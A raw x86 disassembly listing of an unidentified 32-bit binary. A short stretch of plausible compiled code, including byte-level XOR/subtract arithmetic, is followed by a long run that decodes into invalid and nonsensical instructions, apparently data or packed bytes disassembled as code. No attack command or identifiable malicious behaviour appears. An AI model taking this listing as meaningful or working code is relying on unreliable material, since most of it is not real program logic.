  4081f4:	push   DWORD PTR [ebp-0x8]
  4081f7:	lea    eax,[ebp-0x78]
  4081fa:	push   eax
  4081fb:	push   DWORD PTR [ebp-0xc]
  4081fe:	push   DWORD PTR [ebp-0x14]
  408201:	call   0x406508
  408206:	test   eax,eax
  408208:	je     0x408233
  40820e:	lea    eax,[ebp-0x78]
  408211:	push   eax
  408212:	mov    eax,DWORD PTR [ebp-0x14]
  408215:	xor    eax,esi
  408217:	add    eax,edi
  408219:	push   eax
  40821a:	mov    eax,DWORD PTR [ebp-0x10]
  40821d:	add    eax,0xee
  408222:	push   eax
  408223:	mov    eax,DWORD PTR [ebp-0x10]
  408226:	mov    eax,DWORD PTR [eax+0x198]
  40822c:	push   DWORD PTR [eax]
  40822e:	call   0x4120bb
  408233:	mov    ecx,DWORD PTR [ebp-0x1c]
  408236:	xor    ecx,esi
  408238:	mov    eax,0xffcd8d64
  40823d:	sub    eax,ecx
  40823f:	sub    eax,DWORD PTR [ebp-0x8]
  408242:	mov    ecx,DWORD PTR [ebp-0x30]
  408245:	add    ecx,eax
  408247:	mov    eax,DWORD PTR [ebp-0x8]
  40824a:	mov    DWORD PTR [eax+0x1],ecx
  40824d:	mov    al,BYTE PTR [ebp-0x1]
  408250:	mov    ecx,DWORD PTR [ebp-0x8]
  408253:	xor    al,0x47
  408255:	sub    al,0x37
  408257:	jmp    0x4085a4
  40825c:	ja     0x408201
  40825e:	mov    ecx,0x7175496f
  408263:	mov    ds:0xd6da6ce9,eax
  408268:	adc    edi,ebx
  40826a:	icebp  
  40826b:	push   esp
  40826c:	aaa    
  40826d:	shl    BYTE PTR [eax+0x70],cl
  408270:	and    BYTE PTR [ebp+0x70],bh
  408273:	jo     0x4082c7
  408275:	addr16 or al,0x29
  408278:	jle    0x408267
  40827a:	test   eax,0x323a107c
  40827f:	(bad)  
  408280:	sahf   
  408281:	mov    bl,0xb9
  408283:	xor    eax,DWORD PTR ds:0xfd414ae4
  408289:	cwde   
  40828a:	mov    DWORD PTR [edi+0x6b],edi
  40828d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40828e:	xchg   edx,eax
  40828f:	dec    ebx
  408290:	push   esp
  408291:	shl    BYTE PTR [ebp+0x78],cl
  408294:	repnz dec ebx
  408296:	ss xchg ebp,eax
  408298:	jmp    0x178:0x56d6eb8f
  40829f:	fwait
  4082a0:	jmp    0x83e2:0xb99e1c99
  4082a7:	fsub   st(6),st
  4082a9:	ins    DWORD PTR es:[edi],dx
  4082aa:	push   edi
  4082ab:	xchg   ecx,eax
  4082ac:	dec    edi
  4082ad:	(bad)
  4082b1:	push   ecx
  4082b2:	mov    esp,0x9069e245
  4082b7:	mov    DWORD PTR [edx-0x2f605db1],esp
  4082bd:	or     edi,DWORD PTR [edi-0x6d2491bd]
  4082c3:	imul   dh
  4082c5:	xchg   esi,eax
  4082c6:	or     DWORD PTR [ecx],0x60
  4082c9:	adc    al,0x80
  4082cb:	das    
  4082cc:	sbb    eax,edx
  4082ce:	out    0x0,eax
  4082d0:	out    0x40,al
  4082d2:	sbb    eax,0x786f8437
  4082d7:	mov    edx,0xd4a53504
  4082dc:	sbb    al,0xa4
  4082de:	out    0xfa,eax
  4082e0:	(bad)  
  4082e1:	cmp    al,0xef
  4082e3:	cmp    bl,BYTE PTR [eax-0xc]
  4082e6:	inc    ebp
  4082e7:	int    0x40
  4082e9:	jmp    0x8d721682
  4082ee:	popf   
  4082ef:	xchg   esi,eax
  4082f0:	mov    al,0xe4
  4082f2:	iret   
  4082f3:	outs   dx,DWORD PTR ds:[esi]
  4082f4:	(bad)  
  4082f6:	or     al,0xe0
  4082f8:	xor    DWORD PTR ds:0x9d120dcb,0x3c8267dc
  408302:	nop
  408303:	xor    DWORD PTR [edx+0x19896bed],esi
  408309:	mov    ebx,0x5b78d314
  40830e:	jne    0x40834d
  408310:	mov    ds:0xeabfd731,eax
  408315:	scas   eax,DWORD PTR es:[edi]
  408316:	jge    0x408345
  408318:	adc    al,0xe3
  40831a:	repnz lods eax,DWORD PTR ds:[esi]
  40831c:	jb     0x4082f7
  40831e:	mov    ch,al
  408320:	sar    DWORD PTR [edx+0xfab30e2],0xd8
  408327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408328:	es add al,bh
  40832b:	repz pop ds
  40832d:	push   ds
  40832e:	add    ebx,DWORD PTR [ebp-0x423a0e7e]
  408334:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408335:	stc    
  408336:	xchg   ebx,esi
  408338:	idiv   DWORD PTR [edi]
  40833a:	mov    ds:0xd6c2754b,al
  40833f:	dec    edx
  408340:	and    eax,0xe8051f9d
  408346:	sub    BYTE PTR [eax-0x551f9abc],bh
  40834c:	adc    DWORD PTR [ecx],ebp
  40834e:	mov    WORD PTR [esi+0x5634691a],gs
  408354:	push   edx
  408355:	(bad)  
  408356:	cli    
  408357:	and    ah,BYTE PTR [ecx+eiz*8]
  40835a:	sub    BYTE PTR [edx-0x2ac73832],dh
  408360:	inc    esi
  408361:	sub    al,0xce
  408363:	pop    DWORD PTR [edx-0x6e]
  408366:	in     eax,dx
  408367:	loop   0x408327
  408369:	fwait
  40836a:	adc    al,0x29
  40836c:	arpl   cx,dx
  40836e:	xchg   DWORD PTR [edx+eiz*1],ebp
  408371:	sbb    DWORD PTR [edx+0x791657b2],ebp
  408377:	dec    eax
  408378:	scas   al,BYTE PTR es:[edi]
  408379:	aaa    
  40837a:	(bad)  
  40837b:	cmc    
  40837c:	pop    ebp
  40837d:	bound  edx,QWORD PTR [ecx-0x42]
  408380:	arpl   WORD PTR [ecx+0x3a],bx
  408383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408384:	or     edx,DWORD PTR [ebp+ecx*2+0x5b]
  408388:	push   0xffffffe1
  40838a:	pop    eax
  40838b:	jb     0x408318
  40838d:	fstp   st(0)
  408390:	sub    eax,0x683831fd
  408395:	and    esi,eax
  408397:	mov    esp,0x22a56328
  40839c:	arpl   WORD PTR [ecx],sp
  40839e:	push   es
  40839f:	mov    dh,0xaf
  4083a1:	adc    ch,BYTE PTR [edi-0x25ceee61]
  4083a7:	xor    BYTE PTR ds:0x1cf6720c,dh
  4083ad:	dec    eax
  4083ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083af:	aam    0x1a
  4083b1:	pop    ebp
  4083b2:	jmp    0x408378
  4083b4:	je     0x4083ef
  4083b6:	xor    ebx,DWORD PTR [eax+0x29]
  4083b9:	ficomp WORD PTR [eax-0xf98f852]
  4083c0:	bound  edi,QWORD PTR [esi]
  4083c2:	ffree  st(5)
  4083c4:	dec    esp
  4083c5:	fwait
  4083c6:	jmp    0xb510b9e9
  4083cb:	sbb    BYTE PTR [eax-0x68b7dc13],ah
  4083d1:	add    DWORD PTR [eax],ebx
  4083d3:	lds    edi,FWORD PTR [edx+0x5]
  4083d6:	add    BYTE PTR ds:0x6cbd48c6,cl
  4083dc:	dec    ecx
  4083dd:	or     BYTE PTR [ebp-0x3579c70c],bl
  4083e3:	jne    0x40836e
  4083e5:	xor    eax,0xd62f0d24
  4083ea:	mov    ebx,0x8288ec1d
  4083ef:	mov    ds:0xd0dad0db,eax
  4083f4:	dec    ecx
  4083f5:	cmc    
  4083f6:	or     edi,DWORD PTR [edi]
  4083f8:	test   DWORD PTR [ecx-0x1c],ecx
  4083fb:	mov    esi,esp
  4083fd:	int    0x28
  4083ff:	dec    edx
  408400:	mov    esi,0xbced6c3c
  408405:	sub    cl,BYTE PTR [ebx-0x7ab30d04]
  40840b:	inc    esp
  40840c:	daa    
  40840d:	(bad)  
  40840e:	sbb    DWORD PTR [ecx+esi*4-0xd],ebp
  408412:	push   cs
  408413:	xlat   BYTE PTR ds:[ebx]
  408414:	jmp    0x24ffda0d
  408419:	add    al,BYTE PTR [edx-0x1d5ade1c]
  40841f:	mov    eax,0xd2abef3a
  408424:	jge    0x408487
  408426:	jp     0x408414
  408428:	mov    ebp,0xc64d63af
  40842d:	ins    DWORD PTR es:[edi],dx
  40842e:	mov    al,ds:0x14b68064
  408433:	xchg   esp,eax
  408434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408435:	mov    es,esp
  408437:	js     0x40845b
  408439:	punpckhbw mm2,QWORD PTR [edi-0x72]
  40843d:	add    eax,DWORD PTR [ebp+0x780309b0]
  408443:	lock fidivr DWORD PTR ds:0xc8336292
  40844a:	mov    DWORD PTR [ebx-0xc],esp
  40844d:	mov    eax,0x14ad8242
  408452:	sub    BYTE PTR [ecx-0x65e4ade4],bh
  408458:	xor    dl,dl
  40845a:	xchg   ebx,eax
  40845b:	or     al,0xeb
  40845d:	in     al,0x11
  40845f:	xchg   ecx,eax
  408460:	in     eax,0x2
  408462:	inc    esi
  408463:	pop    ss
  408464:	or     esp,DWORD PTR [edi+0x5b]
  408467:	std    
  408468:	lea    esi,[edi]
  40846a:	jne    0x408480
  40846c:	jbe    0x408435
  40846e:	ins    DWORD PTR es:[edi],dx
  40846f:	lock lods al,BYTE PTR ds:[esi]
  408471:	sbb    eax,0x6d0b2ff0
  408476:	fisubr WORD PTR [edi]
  408478:	sbb    ebp,edi
  40847a:	push   es
  40847b:	loopne 0x4084c2
  40847d:	fwait
  40847e:	mov    ebp,0xe11d1ec7
  408483:	pop    ebp
  408484:	push   esp
  408485:	in     al,0x77
  408487:	outs   dx,DWORD PTR ds:[esi]
  408488:	icebp  
  408489:	test   DWORD PTR [esi-0x21eb8ae5],0x55c73068
  408493:	mov    ah,0x66
  408495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408496:	cmp    ch,BYTE PTR cs:[eax]
  408499:	xor    eax,0xffe04a56
  40849e:	je     0x40847e
  4084a0:	xchg   edx,eax
  4084a1:	inc    esp
  4084a2:	jg     0x4084ca
  4084a4:	(bad)  
  4084a5:	xchg   esp,eax
  4084a6:	mov    edx,ebx
  4084a8:	pop    edi
  4084a9:	xchg   esi,eax
  4084aa:	sub    eax,0x18496eb3
  4084af:	je     0x408488
  4084b1:	addr16 das 
  4084b3:	fldenv [edi-0x5]
  4084b6:	pop    edx
  4084b7:	daa    
  4084b8:	sbb    ebp,DWORD PTR [edx]
  4084ba:	xor    DWORD PTR [ebp+0x4e],eax
  4084bd:	mov    al,ds:0x43888b45
  4084c2:	inc    ecx
  4084c3:	push   edx
  4084c4:	call   0x148f:0xb1d09cb
  4084cb:	or     dl,ah
  4084cd:	fist   DWORD PTR [edx-0x54]
  4084d0:	loopne 0x4084f2
  4084d2:	push   ebx
  4084d3:	je     0x4084c0
  4084d5:	push   0x2377a431
  4084da:	into   
  4084db:	pop    ebx
  4084dc:	out    0xee,eax
  4084de:	and    bl,BYTE PTR [edx]
  4084e0:	fld    TBYTE PTR [edx-0x4ea39aa0]
  4084e6:	jge    0x408492
  4084e8:	xchg   esi,eax
  4084e9:	or     ecx,ecx
  4084eb:	xlat   BYTE PTR ds:[ebx]
  4084ec:	dec    edi
  4084ed:	mov    esi,0xa4b7171a
  4084f2:	pop    eax
  4084f3:	bound  ebp,QWORD PTR [edx+0x2ca0e45d]
  4084f9:	add    BYTE PTR [eax+0x23],dl
  4084fc:	mov    ecx,0xb5c289df
  408501:	mov    ds:0xb0800fd5,eax
  408506:	into   
  408507:	test   bh,ch
  408509:	stos   BYTE PTR es:[edi],al
  40850a:	aad    0x10
  40850c:	ins    DWORD PTR es:[edi],dx
  40850d:	(bad)  
  40850f:	jnp    0x408569
  408511:	dec    edi
  408512:	sbb    eax,0xbf56d9b2
  408517:	ror    DWORD PTR [esi-0x7431abaf],1
  40851d:	or     DWORD PTR [eax+0x6aabdff9],ebp
  408523:	icebp  
  408524:	test   DWORD PTR [ebx+0xf886a62],eax
  40852a:	sub    edx,DWORD PTR [esi+0x718fa062]
  408530:	mov    dh,0xa9
  408532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408533:	jge    0x408525
  408535:	adc    BYTE PTR [esi-0x35],dl
  408538:	lahf   
  408539:	xor    BYTE PTR [edi-0x106f693],0x27
  408540:	or     bh,dh
  408542:	pop    esi
  408544:	dec    ecx
  408545:	xchg   esp,eax
  408546:	outs   dx,DWORD PTR ds:[esi]
  408547:	and    cl,bh
  408549:	xor    al,0x46
  40854b:	retf   0xb6a0
  40854e:	inc    eax
  40854f:	shl    BYTE PTR [esp+edx*4],cl
  408552:	inc    esp
  408553:	lods   al,BYTE PTR ds:[esi]
  408554:	jle    0x40852c
  408556:	xchg   esp,eax
  408557:	les    edx,FWORD PTR [edi-0x61680c14]
  40855d:	dec    eax
  40855e:	inc    ecx
  40855f:	das    
  408560:	sub    al,0xf2
  408562:	imul   BYTE PTR [ebx]
  408564:	cmp    eax,0x2e67f1d0
  408569:	add    BYTE PTR [edi-0x50],ch
  40856c:	pop    edi
  40856d:	push   ebx
  40856e:	in     eax,0x92
  408570:	jo     0x408503
  408572:	in     al,dx
  408573:	cmp    bh,al
  408575:	call   0xe411:0x7e0a9ba3
  40857c:	jmp    0x1a4f:0x241fadba
  408583:	and    al,BYTE PTR [esi+edi*4-0xd]
  408587:	aaa    
  408588:	xchg   ebp,eax
  408589:	jo     0x4085a7
  40858b:	pop    ecx
  40858c:	(bad)  
  40858d:	les    eax,FWORD PTR [ebx+0xc]
  408590:	adc    eax,0xdebe9a05
  408595:	pop    esi
  408596:	xchg   edi,eax
  408597:	jle    0x40856e
  408599:	imul   ebp,esi,0xf7e86eea
  40859f:	and    eax,0xd72c84de
  4085a4:	mov    BYTE PTR [ecx],al
  4085a6:	jmp    0x4088f3
  4085ab:	inc    edi
  4085ac:	cli    
  4085ad:	fisttp DWORD PTR [edx+0x517569e1]
  4085b3:	jp     0x40858b
  4085b5:	xchg   ecx,eax
  4085b6:	mov    edx,0xa0bab7d
  4085bb:	out    0xdf,eax
  4085bd:	jo     0x40862f
  4085bf:	and    BYTE PTR [ebp+0x70],bh
  4085c2:	jo     0x4085d1
  4085c4:	cmp    ah,dl
  4085c6:	loope  0x408577
  4085c8:	mov    esp,0x38fd3b61
  4085cd:	out    dx,al
  4085ce:	repnz out 0x7c,al
  4085d1:	push   ebx
  4085d2:	mov    ebx,0x45dd16f1
  4085d7:	lahf   
  4085d8:	cmp    BYTE PTR [ecx],al
  4085da:	int    0xfa
  4085dc:	dec    esp
  4085dd:	dec    eax
  4085de:	xchg   esp,eax
  4085df:	out    0x5f,al
  4085e1:	enter  0xecd1,0x57
  4085e5:	cwde   
  4085e6:	jns    0x4085a7
  4085e8:	push   esi
  4085e9:	loope  0x408615
  4085eb:	xchg   ecx,eax
  4085ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ed:	xor    eax,DWORD PTR [esi+esi*4-0x7]
  4085f1:	or     DWORD PTR [eax+0x1e],0xe4fb69e6
  4085f8:	push   ebp
  4085f9:	(bad)  
  4085fb:	icebp  
  4085fc:	or     eax,DWORD PTR [ebx+0x60]
  4085ff:	cli    
  408600:	hlt    
  408601:	mov    bl,BYTE PTR [esi-0x6bc38719]
  408607:	ret    0xb5c0
  40860a:	push   edx
  40860b:	mov    ebp,0xa489a55
  408610:	push   ebp
  408611:	push   0xb1f127b5
  408616:	sbb    eax,0xa2a24d68
  40861b:	mov    WORD PTR [esi-0x7c],ds
  40861e:	mov    bh,0xa5
  408621:	xor    dh,BYTE PTR [ebp+0x51000675]
  408627:	pop    ebp
  408628:	bound  esi,QWORD PTR [ebp+0x52480230]
  40862e:	push   esp
  40862f:	and    eax,0x600589ea
  408634:	shl    BYTE PTR [ecx+0x78dc5f36],0xed
  40863b:	inc    ebx
  40863c:	cmp    DWORD PTR [edi],ebx
  40863e:	gs sahf 
  408640:	std    
  408641:	mov    bh,0xe0
  408643:	cmc    
  408644:	inc    esi
  408645:	test   BYTE PTR [eax-0x6],dl
  408648:	mov    cl,0xdb
  40864a:	loope  0x408625
  40864c:	mov    ecx,0x3d0029de
  408651:	shl    ah,cl
  408653:	adc    eax,0xaf0b93a0
  408658:	pop    ds
  408659:	inc    ebx
  40865a:	mov    bh,0x2e
  40865c:	repnz dec BYTE PTR [eax+0x4e]
  408660:	cmp    ecx,DWORD PTR [ebp-0x3bdc1c5]
  408666:	dec    ebx
  408667:	jg     0x40860d
  408669:	sbb    al,0x89
  40866b:	cmp    dh,BYTE PTR [ebx+0x3318a514]
  408671:	ds jp  0x40864f
  408674:	sub    esp,edi
  408676:	dec    ecx
  408677:	mov    dl,0x68
  408679:	or     esp,ebp
  40867b:	fdiv   DWORD PTR [ecx-0x44]
  40867e:	xor    DWORD PTR [ebp-0x7c],0xffffff84
  408682:	pop    ecx
  408683:	mov    ds:0x3b3ea8db,al
  408688:	(bad)  
  408689:	adc    eax,0x4a648205
  40868e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40868f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408690:	xchg   ebx,eax
  408691:	bound  ebp,QWORD PTR [ecx-0x31]
  408694:	addr16 enter 0x56a0,0x4a
  408699:	xchg   edx,eax
  40869a:	rcr    DWORD PTR ds:0x5ab9880e,1
  4086a0:	pop    ds
  4086a1:	inc    eax
  4086a2:	ret    
  4086a3:	xor    eax,0x63d4e41b
  4086a8:	(bad)  
  4086a9:	out    0xec,al
  4086ab:	clc    
  4086ac:	mov    bh,0xf9
  4086ae:	push   eax
  4086af:	lods   eax,DWORD PTR ds:[esi]
  4086b0:	in     eax,0xac
  4086b2:	lods   al,BYTE PTR ds:[esi]
  4086b3:	sbb    DWORD PTR [esi],eax
  4086b5:	mov    ds:0xae055154,al
  4086ba:	icebp  
  4086bb:	ins    BYTE PTR es:[edi],dx
  4086bc:	mov    ecx,0xe01d100a
  4086c1:	xchg   edi,eax
  4086c2:	mov    cl,0xfd
  4086c4:	dec    ebx
  4086c5:	pop    esi
  4086c6:	add    al,0x15
  4086c8:	imul   ebx,ebx,0x7d
  4086cb:	not    BYTE PTR [edi-0x74ec7586]
  4086d1:	sub    al,0xf2
  4086d3:	cmp    al,BYTE PTR [ecx-0x17965df3]
  4086d9:	fsub   QWORD PTR [ecx-0x56b21e85]
  4086df:	inc    edx
  4086e0:	loope  0x40871c
  4086e2:	fs push ecx
  4086e4:	push   ecx
  4086e5:	fdivr  QWORD PTR [ecx]
  4086e7:	aad    0x4a
  4086e9:	rol    DWORD PTR [edi],0xee
  4086ec:	imul   esi
  4086ee:	(bad)  
  4086ef:	sti    
  4086f0:	dec    edx
  4086f1:	dec    edx
  4086f2:	into   
  4086f3:	cdq    
  4086f4:	or     eax,0xe8ac7a0f
  4086f9:	xchg   edi,eax
  4086fa:	dec    edi
  4086fb:	jle    0x4086db
  4086fd:	push   esi
  4086fe:	fstp   QWORD PTR [edx-0x4c]
  408701:	dec    ebp
  408702:	ds in  al,0xa2
  408705:	ret    
  408706:	and    bh,cl
  408708:	lods   al,BYTE PTR ds:[esi]
  408709:	mov    dl,0xbd
  40870b:	mov    dl,0x22
  40870d:	int    0x5c
  40870f:	push   es
  408710:	loopne 0x4086c7
  408712:	cld    
  408713:	int    0xbe
  408715:	jne    0x40869f
  408717:	jg     0x408759
  408719:	(bad)  
  40871b:	mov    BYTE PTR [ebp+0x1],dh
  40871e:	sbb    BYTE PTR es:0xe2e1272a,0xb8
  408726:	(bad)  
  408727:	adc    bl,dl
  408729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40872a:	xor    BYTE PTR [esi-0x13830b77],bl
  408730:	and    DWORD PTR [esp+edx*4-0x4ba4d2ae],ebx
  408737:	cmp    edx,DWORD PTR [ebx-0x50]
  40873a:	jle    0x4086d2
  40873c:	pop    esi
  40873d:	in     eax,0x55
  40873f:	mov    eax,ds:0xd8527361
  408744:	scas   al,BYTE PTR es:[edi]
  408745:	mov    cl,0xf2
  408747:	mov    ecx,DWORD PTR [edi]
  408749:	mov    DWORD PTR [edi-0x1e],esp
  40874c:	ins    DWORD PTR es:[edi],dx
  40874d:	retf   
  40874e:	dec    edi
  40874f:	pop    esi
  408750:	scas   al,BYTE PTR es:[edi]
  408751:	and    bh,BYTE PTR [ecx]
  408753:	(bad)  
  408754:	repnz call FWORD PTR [esi]
  408757:	enter  0xde2c,0xab
  40875b:	cwde   
  40875c:	ss xchg edx,eax
  40875e:	cmp    al,0x23
  408760:	repnz or esi,DWORD PTR [ebx+0x59]
  408764:	fcom   DWORD PTR [edi]
  408766:	out    dx,al
  408767:	mov    edx,0x8a9ea467
  40876c:	(bad)  
  40876d:	add    ch,cl
  40876f:	popa   
  408770:	xchg   ecx,eax
  408771:	cmp    edi,DWORD PTR [eax-0x80]
  408774:	pushf  
  408775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408776:	adc    eax,0x3498a1a1
  40877b:	enter  0x671c,0x21
  40877f:	es aad 0x95
  408782:	test   al,0x6d
  408784:	ins    BYTE PTR es:[edi],dx
  408785:	ror    DWORD PTR [ebx],1
  408787:	test   al,0x36
  408789:	cmp    BYTE PTR [ebp*4+0x16a4e937],al
  408790:	or     dh,BYTE PTR [ebp-0x32714338]
  408796:	fisub  WORD PTR [ebp+0x6]
  408799:	dec    ecx
  40879a:	jns    0x408809
  40879c:	imul   ebx,DWORD PTR ds:0xe67490d8,0x0
  4087a3:	dec    ebp
  4087a4:	sbb    ah,BYTE PTR [edi]
  4087a6:	pop    eax
  4087a7:	cmp    edx,edi
  4087a9:	retf   0x6514
  4087ac:	fcmovnb st,st(3)
  4087ae:	adc    DWORD PTR [eax-0x27],ecx
  4087b1:	imul   BYTE PTR [esi-0x2e1083ed]
  4087b7:	popf   
  4087b8:	retf   
  4087b9:	por    mm6,QWORD PTR [edi+0x628a3edf]
  4087c0:	adc    ebp,edx
  4087c2:	leave  
  4087c3:	xchg   esp,eax
  4087c5:	sar    BYTE PTR [esi+edi*2-0x343c435a],1
  4087cc:	add    cl,BYTE PTR [edx-0x5e]
  4087cf:	inc    eax
  4087d0:	dec    esp
  4087d1:	push   0xffffffd1
  4087d3:	test   al,0x51
  4087d5:	enter  0x3d1,0x1f
  4087d9:	cld    
  4087da:	fild   DWORD PTR [ebp-0x1b3d2c99]
  4087e0:	and    al,0x1f
  4087e2:	nop
  4087e3:	imul   ebp,DWORD PTR [edx+ebx*1+0x73],0xffffffe7
  4087e8:	js     0x408803
  4087ea:	dec    ecx
  4087eb:	jmp    0xd4a5:0xad0d317c
  4087f2:	or     DWORD PTR [eax],0x5609934b
  4087f8:	outs   dx,DWORD PTR ds:[esi]
  4087f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087fa:	dec    ecx
  4087fb:	aaa    
  4087fc:	xor    dl,dh
  4087fe:	adc    al,0x4b
  408800:	aad    0x6c
  408802:	sub    al,0x42
  408804:	mov    eax,DWORD PTR [ecx]
  408806:	xchg   edx,eax
  408807:	pop    ds
  408808:	mov    al,ds:0xc5a6c428
  40880d:	xchg   ebx,eax
  40880e:	xchg   esi,eax
  40880f:	mov    al,ds:0x7eaff21c
  408814:	push   esp
  408815:	ss pushf 
  408817:	ficom  DWORD PTR [ecx]
  408819:	repnz in eax,dx
  40881b:	jnp    0x408805
  40881d:	loopne 0x4087e0
  40881f:	shl    DWORD PTR [ebx-0x32],0x74
  408823:	inc    ecx
  408824:	fs push ss
  408826:	fmul   DWORD PTR [eax]
  408828:	xor    eax,0x23048294
  40882d:	hlt    
  40882e:	mov    ah,0x96
  408830:	mov    bl,0x11
  408832:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  408834:	and    eax,0xaaae04e2
  408839:	in     al,0x1f
  40883b:	pop    edi
  40883c:	push   edx
  40883d:	imul   ecx,DWORD PTR [esi+eiz*2-0x676cb262],0x9dd119d1
  408848:	jb     0x40885d
  40884a:	pop    ecx
  40884b:	adc    al,BYTE PTR [eax-0x2716cc8b]
  408851:	push   eax
  408852:	loopne 0x4087ec
  408854:	sti    
  408855:	or     bh,BYTE PTR [ebp-0x7f2209d1]
  40885b:	cmp    BYTE PTR ds:0x9c299d6a,dl
  408861:	dec    edi
  408862:	add    al,0xe4
  408864:	push   DWORD PTR [edi]
  408866:	and    BYTE PTR [ebx+eiz*4],dh
  408869:	push   esp
  40886a:	in     al,0xb0
  40886c:	enter  0xf774,0xb8
  408870:	clc    
  408871:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408872:	sub    DWORD PTR [edi+eiz*1+0x5e],esi
  408876:	mov    edx,0xf442ad76
  40887b:	icebp  
  40887c:	mov    ch,0x8f
  40887e:	gs jle 0x4088a9
  408881:	sbb    BYTE PTR [ebp-0x29],ah
  408884:	or     ah,BYTE PTR [ecx]
  408886:	lds    edi,FWORD PTR [ebx+ebx*1-0x3b99bdf5]
  40888d:	enter  0xe72a,0xe4
  408891:	push   esi
  408892:	mov    ah,0x12
  408894:	popa   
  408895:	sar    edx,0xa7
  408898:	xchg   esi,eax
  408899:	clc    
  40889a:	je     0x408860
  40889c:	pop    es
  40889d:	mov    ds:0xf31f5292,eax
  4088a2:	bound  edx,QWORD PTR [edi-0x45]
  4088a5:	jg     0x4088ce
  4088a7:	bound  edx,QWORD PTR [eax*1+0x6c28d75f]
  4088ae:	nop
  4088af:	and    DWORD PTR [eax],esp
  4088b1:	cdq    
  4088b2:	pop    ds
  4088b3:	enter  0x802f,0xfd
  4088b7:	push   es
  4088b8:	xor    ecx,ebx
  4088ba:	fnsave [eax+ecx*8+0x259fe87c]
  4088c1:	mov    ebx,0x205ab7b0
  4088c6:	sbb    BYTE PTR [ecx+0x3a],dl
  4088c9:	arpl   sp,bp
  4088cb:	aaa    
  4088cc:	ins    DWORD PTR es:[edi],dx
  4088cd:	pop    ebp
  4088ce:	(bad)  
  4088cf:	or     al,0x93
  4088d1:	inc    esi
  4088d2:	sbb    dl,ah
  4088d4:	jno    0x4088cf
  4088d6:	add    edi,DWORD PTR [esi]
  4088d8:	xchg   ecx,eax
  4088d9:	lds    ebp,FWORD PTR [eax-0x33]
  4088dc:	test   eax,0x8df26623
  4088e1:	xchg   edx,eax
  4088e2:	in     al,dx
  4088e3:	stos   BYTE PTR es:[edi],al
  4088e4:	int    0x1e
  4088e6:	mov    WORD PTR [edx],ss
  4088e8:	jns    0x40891d
  4088ea:	xor    DWORD PTR [edx-0x3c59e6bc],ecx
  4088f0:	mov    dl,0x35
  4088f2:	mov    BYTE PTR [ebp+0xfef845],cl
  4088f8:	inc    eax
  4088f9:	push   eax
  4088fa:	jmp    0x408c47
  4088ff:	mov    al,0x3c
  408901:	fwait
  408902:	xchg   ebx,eax
  408903:	fwait
  408904:	jae    0x40896e
  408906:	rol    DWORD PTR [ebp-0xdbca301],cl
  40890c:	rcl    BYTE PTR [ecx-0x60],1
  40890f:	xchg   edi,eax
  408910:	fdiv   QWORD PTR [eax+0x70]
  408913:	and    BYTE PTR [ebp+0x70],bh
  408916:	jo     0x4088cc
  408918:	ret    
  408919:	(bad)  
  40891a:	(bad)  
  40891b:	adc    DWORD PTR [ebx-0x651e85d9],eax
  408921:	fdiv   DWORD PTR [edx]
  408923:	sub    BYTE PTR [ebx],ah
  408925:	adc    DWORD PTR [esp+ebx*1],eax
  408928:	aas    
  408929:	add    ebp,ecx
  40892b:	pop    ecx
  40892c:	dec    ecx
  40892d:	mov    esp,0x6f359bb9
  408932:	scas   eax,DWORD PTR es:[edi]
  408933:	and    edi,DWORD PTR [edx+0x6b2dd84c]
  408939:	inc    ebx
  40893a:	jp     0x4088cf
  40893c:	jnp    0x4088d9
  40893e:	jg     0x4089a7
  408940:	ret    
  408941:	add    DWORD PTR [esi-0x5c],edi
  408944:	pop    ecx
  408945:	adc    al,0x12
  408947:	pop    esp
  408948:	and    eax,0x13f41a1e
  40894d:	stos   BYTE PTR es:[edi],al
  40894e:	dec    esi
  40894f:	adc    eax,0xc0a2420
  408954:	in     eax,dx
  408955:	sbb    al,0x5d
  408957:	(bad)  
  408958:	aas    
  408959:	(bad)  
  40895b:	imul   edx,ebx,0x19
  40895e:	int3   
  40895f:	hlt    
  408960:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408962:	arpl   di,ax
  408964:	pop    ecx
  408965:	std    
  408966:	leave  
  408967:	gs ret 
  408969:	push   0x5db4966d
  40896e:	xor    ebx,0x4ae40910
  408974:	(bad)  
  408975:	stos   DWORD PTR es:[edi],eax
  408976:	mov    esp,0x5215e47c
  40897b:	jno    0x408943
  40897d:	dec    eax
  40897e:	sub    DWORD PTR [edx+0x3ab79865],0xf361610a
  408988:	push   eax
  408989:	(bad)
  40898c:	cli    
  40898d:	(bad)  
  40898e:	mov    ah,0x81
  408990:	dec    esp
  408991:	adc    BYTE PTR [ecx+0x72],0x86
  408995:	or     BYTE PTR [esi-0x2742c4ce],0xa
  40899c:	xchg   BYTE PTR [eax-0x13571b88],bl
  4089a2:	lea    eax,[edi+0x72]
  4089a5:	xor    DWORD PTR [esi+0xc],esp
  4089a8:	push   edx
  4089a9:	adc    eax,DWORD PTR [edx-0xf]
  4089ac:	jb     0x408943
  4089ae:	dec    esp
  4089af:	loopne 0x4089e6
  4089b1:	and    DWORD PTR [ecx+eax*8-0x3a],ecx
  4089b5:	addr16 call 0xb1f173c4
  4089bb:	jl     0x40897d
  4089bd:	mov    ?,WORD PTR [ecx+0x78]
  4089c0:	jae    0x408a3d
  4089c2:	jne    0x408979
  4089c4:	sahf   
  4089c5:	les    ebp,FWORD PTR [ebx-0x41ebb2da]
  4089cb:	jmp    edx
  4089cd:	adc    ebx,ebp
  4089cf:	jl     0x408a4a
  4089d1:	add    DWORD PTR [ebp-0x35],0x26
  4089d5:	xchg   ecx,eax
  4089d6:	inc    ebp
  4089d7:	scas   al,BYTE PTR es:[edi]
